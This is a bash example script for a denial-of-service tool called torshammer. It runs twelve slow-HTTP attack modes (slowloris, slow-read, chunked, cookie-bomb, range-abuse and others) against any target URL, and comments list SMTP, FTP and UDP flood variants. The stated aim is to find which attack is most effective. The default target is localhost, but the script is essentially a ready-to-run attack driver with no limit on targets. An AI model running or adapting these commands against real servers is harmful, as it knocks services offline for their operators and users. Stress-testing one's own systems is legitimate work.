#!/bin/bash
# Example: Testing every attack mode
# ==================================
# This script demonstrates how to test a target using each of the
# fifteen available attack modes to identify which is most effective.

TARGET_URL="${1:-http://localhost:8080}"

echo "Testing all attack modes against $TARGET_URL"
echo "=============================================="
echo ""

# Mode 1: slow-post (default)
# Sends POST body very slowly to keep connections open
echo "1. Testing slow-post mode..."
torshammer -u "$TARGET_URL" -m slow-post -c 128 -d 30
echo ""

# Mode 2: slow-post-headers
# Leaks the request line and every header, then dribbles the body
echo "2. Testing slow-post-headers mode..."
torshammer -u "$TARGET_URL" -m slow-post-headers -c 128 -d 30
echo ""

# Mode 3: slow-headers (slowloris)
# Sends HTTP headers very slowly and never finishes them
echo "3. Testing slow-headers mode..."
torshammer -u "$TARGET_URL" -m slow-headers -c 128 -d 30
echo ""

# Mode 4: slow-read
# Opens connections and reads responses very slowly
echo "4. Testing slow-read mode..."
torshammer -u "$TARGET_URL" -m slow-read -c 128 -d 30
echo ""

# Mode 5: chunked
# Uses chunked transfer encoding with slow chunk delivery
echo "5. Testing chunked mode..."
torshammer -u "$TARGET_URL" -m chunked -c 128 -d 30
echo ""

# Mode 6: multipart-slow-upload
# Dribbles MIME parts and never emits the closing boundary
echo "6. Testing multipart-slow-upload mode..."
torshammer -u "$TARGET_URL" -m multipart-slow-upload -c 128 -d 30
echo ""

# Mode 7: expect-continue-abuse
# Stalls the body after the interim 100 Continue response
echo "7. Testing expect-continue-abuse mode..."
torshammer -u "$TARGET_URL" -m expect-continue-abuse -c 128 -d 30
echo ""

# Mode 8: websocket-slow-upgrade
# Requests a WebSocket upgrade and never completes the handshake
echo "8. Testing websocket-slow-upgrade mode..."
torshammer -u "$TARGET_URL" -m websocket-slow-upgrade -c 128 -d 30
echo ""

# Mode 9: http-pipelining
# Pipelines requests without reading the responses
echo "9. Testing http-pipelining mode..."
torshammer -u "$TARGET_URL" -m http-pipelining -c 128 -d 30
echo ""

# Mode 10: range-abuse
# Sends many randomized Range requests on each connection
echo "10. Testing range-abuse mode..."
torshammer -u "$TARGET_URL" -m range-abuse -c 128 -d 30
echo ""

# Mode 11: cookie-bomb
# Sends an oversized Cookie header and keeps the connection open
echo "11. Testing cookie-bomb mode..."
torshammer -u "$TARGET_URL" -m cookie-bomb -c 128 -d 30
echo ""

# Mode 12: jsonrpc-slow
# Dribbles a JSON-RPC payload that is never completed
echo "12. Testing jsonrpc-slow mode..."
torshammer -u "$TARGET_URL" -m jsonrpc-slow -c 128 -d 30
echo ""

# Modes 13-15 need a target that speaks the protocol, so they are opt-in:
#   torshammer -u http://mail.example.com:25 -m smtp-slow-envelope -c 64 -d 30
#   torshammer -u http://ftp.example.com:21  -m ftp-slow-command  -c 64 -d 30
#   torshammer -u udp://dns.example.com:53   -m udp              -c 100 -d 30

echo "All modes tested. Review the results to see which was most effective."

# Explanation:
# -m: Attack mode (see docs/attack-modes.md for the complete list)
# -c: Number of concurrent connections (reduced to 128 for testing)
# -d: Duration in seconds (30 seconds per mode for quick testing)
